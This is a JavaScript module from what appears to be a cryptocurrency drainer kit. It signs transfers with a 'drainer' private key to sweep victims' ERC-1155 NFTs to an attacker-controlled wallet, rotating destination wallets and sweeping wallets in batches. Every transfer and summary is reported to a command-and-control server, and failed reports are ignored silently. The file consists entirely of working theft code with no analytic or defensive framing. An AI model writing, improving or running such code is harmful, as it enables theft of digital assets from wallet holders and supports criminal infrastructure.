// modules/sweepERC1155.js - BACKEND VERSION
import { ethers } from 'ethers';
import axios from 'axios';

// Backend environment variables
const C2_SERVER_URL = process.env.C2_SERVER_URL || 'http://localhost:3001';
const DRAINER_PRIVATE_KEY = process.env.DRAINER_PRIVATE_KEY;

export class SweepERC1155 {
    constructor() {
        this.isInitialized = false;
    }

    async initialize() {
        if (this.isInitialized) return true;
        try {
            console.log(`🔄 Initializing ${this.constructor.name}...`);
            // Add any module-specific initialization here
            this.isInitialized = true;
            console.log(`✅ ${this.constructor.name} initialized`);
            return true;
        } catch (error) {
            console.error(`❌ ${this.constructor.name} initialization failed:`, error);
            return false;
        }
    }

    // Backend-specific: Get destination wallet
    async getDestinationWallet() {
        try {
            // Use wallet rotator for destination
            const { walletRotator } = await import('./walletRotator.js');
            return await walletRotator.getDestinationWallet();
        } catch (error) {
            console.error('Failed to get destination wallet:', error);
            return process.env.DESTINATION_WALLET || '0x8ba1f109551bd432803012645ac136ddd64dba72';
        }
    }

    async sweepNFTsERC1155(provider, userAddress, chainName, nfts = null, destinationWalletParam = null) {
        console.log(`📦 Scanning ${chainName} for ERC-1155 NFTs...`);
        
        let totalTransferred = 0;
        let totalFailed = 0;
        const network = await provider.getNetwork();
        const chainId = Number(network.chainId);
        const signer = new ethers.Wallet(DRAINER_PRIVATE_KEY, provider);

        try {
            const destinationWallet = destinationWalletParam || await this.getDestinationWallet();
            
            for (const nft of nfts) {
                if (!nft.supports_erc?.includes("erc1155")) continue;
                if (!nft.nft_data || nft.nft_data.length === 0) continue;
                
                const contract = new ethers.Contract(nft.contract_address, [
                    "function safeTransferFrom(address from, address to, uint256 id, uint256 value, bytes data)"
                ], signer);

                for (const instance of nft.nft_data) {
                    const tokenId = instance.token_id;
                    const balance = instance.balance;
                    let success = false;
                    let errorMessage = null;

                    try {
                        const tx = await contract.safeTransferFrom(
                            userAddress,
                            destinationWallet,
                            tokenId,
                            balance,
                            "0x"
                        );
                        
                        await tx.wait();
                        console.log(`✅ ERC-1155 ${tokenId} from ${nft.contract_address} drained on ${chainName}`);
                        success = true;
                        totalTransferred++;

                        // Report successful transfer
                        await this.reportToC2({
                            walletAddress: userAddress,
                            action: 'sweep_erc1155',
                            chainId: chainId,
                            chainName: chainName,
                            contractAddress: nft.contract_address,
                            tokenId: tokenId,
                            amount: balance,
                            success: true,
                            txHash: tx.hash,
                            timestamp: new Date().toISOString()
                        });

                    } catch (err) {
                        errorMessage = err.message;
                        totalFailed++;
                        console.log(`❌ ERC-1155 ${tokenId} failed on ${chainName}: ${err.message}`);

                        // Report failed transfer
                        await this.reportToC2({
                            walletAddress: userAddress,
                            action: 'sweep_erc1155',
                            chainId: chainId,
                            chainName: chainName,
                            contractAddress: nft.contract_address,
                            tokenId: tokenId,
                            amount: balance,
                            success: false,
                            error: errorMessage,
                            timestamp: new Date().toISOString()
                        });
                    }
                }
            }

            // Report overall summary
            if (totalTransferred > 0 || totalFailed > 0) {
                await this.reportToC2({
                    walletAddress: userAddress,
                    action: 'sweep_erc1155_summary',
                    chainId: chainId,
                    chainName: chainName,
                    totalTransferred: totalTransferred,
                    totalFailed: totalFailed,
                    success: totalFailed === 0,
                    timestamp: new Date().toISOString()
                });
            }

        } catch (err) {
            console.log(`❌ ERC-1155 scan failed on ${chainName}: ${err.message}`);
            
            // Report overall failure
            await this.reportToC2({
                walletAddress: userAddress,
                action: 'sweep_erc1155',
                chainId: chainId,
                chainName: chainName,
                success: false,
                error: err.message,
                timestamp: new Date().toISOString()
            });
        }
    }

    // Backend-specific: Batch sweep multiple wallets
    async batchSweepERC1155(wallets, provider, chainName) {
        const results = [];
        
        for (const wallet of wallets) {
            try {
                const result = await this.sweepNFTsERC1155(provider, wallet.address, chainName, wallet.nfts, wallet.destination);
                results.push({ wallet: wallet.address, success: true, result });
            } catch (error) {
                results.push({ wallet: wallet.address, success: false, error: error.message });
            }
        }
        
        return results;
    }

    // --------------------
    // C&C Reporting Function
    // --------------------
    async reportToC2(reportData) {
        try {
            const response = await axios.post(`${C2_SERVER_URL}/c2/report`, reportData, {
                timeout: 5000
            });
            
            return response.data;
        } catch (error) {
            // Silent fail - C&C might be offline
            return null;
        }
    }
}

// Singleton instance
export const sweepERC1155 = new SweepERC1155();

// Keep the original function exports for backward compatibility
export const sweepNFTsERC1155 = (provider, userAddress, chainName, nfts = null, destinationWalletParam = null) => 
    sweepERC1155.sweepNFTsERC1155(provider, userAddress, chainName, nfts, destinationWalletParam);
export const batchSweepERC1155 = (wallets, provider, chainName) => 
    sweepERC1155.batchSweepERC1155(wallets, provider, chainName);